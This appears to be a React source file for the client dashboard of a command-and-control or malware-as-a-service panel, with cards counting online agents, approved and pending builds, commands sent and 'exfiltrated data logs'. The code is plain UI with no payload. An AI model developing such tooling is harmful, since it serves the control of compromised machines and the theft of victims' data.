import React, { useState, useEffect } from 'react';
import { Shield, Users, Code, Activity, AlertTriangle, FileText } from 'lucide-react';

const StatCard = ({ title, value, icon: Icon, color }) => (
    <div className="bg-white p-6 rounded-lg shadow">
      <div className="flex items-start justify-between">
        <div className="flex flex-col space-y-2">
          <p className="text-sm font-medium text-gray-500">{title}</p>
          <p className="text-3xl font-bold text-gray-900">{value}</p>
        </div>
        <div className={`p-3 rounded-full bg-${color}-100 text-${color}-600`}>
          <Icon className="w-6 h-6" />
        </div>
      </div>
    </div>
);

const ClientDashboard = () => {
  const [stats, setStats] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchStats = async () => {
      try {
        const token = localStorage.getItem('token');
        const response = await fetch('http://localhost:3001/api/client/stats', {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });

        if (!response.ok) {
          throw new Error('Failed to fetch stats');
        }

        const data = await response.json();
        setStats(data);
      } catch (err) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
    };

    fetchStats();
  }, []);

  if (loading) return <div>Loading dashboard...</div>;
  if (error) return <div className="text-red-500">Error: {error}</div>;
  if (!stats) return <div>No stats available.</div>;

  const statCards = [
    { title: 'Online Agents', value: stats.online_agents || 0, icon: Shield, color: 'green' },
    { title: 'Total Agents', value: stats.total_agents || 0, icon: Users, color: 'blue' },
    { title: 'Approved Builds', value: stats.approved_builds || 0, icon: Code, color: 'purple' },
    { title: 'Pending Builds', value: stats.pending_builds || 0, icon: AlertTriangle, color: 'yellow' },
    { title: 'Total Commands Sent', value: stats.total_commands || 0, icon: Activity, color: 'indigo' },
    { title: 'Exfiltrated Data Logs', value: stats.exfiltrated_logs || 0, icon: FileText, color: 'red' },
  ];

  return (
    <div className="p-6">
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {statCards.map(card => (
          <StatCard key={card.title} {...card} />
        ))}
      </div>
      {/* Additional dashboard components can be added here */}
    </div>
  );
};

export default ClientDashboard;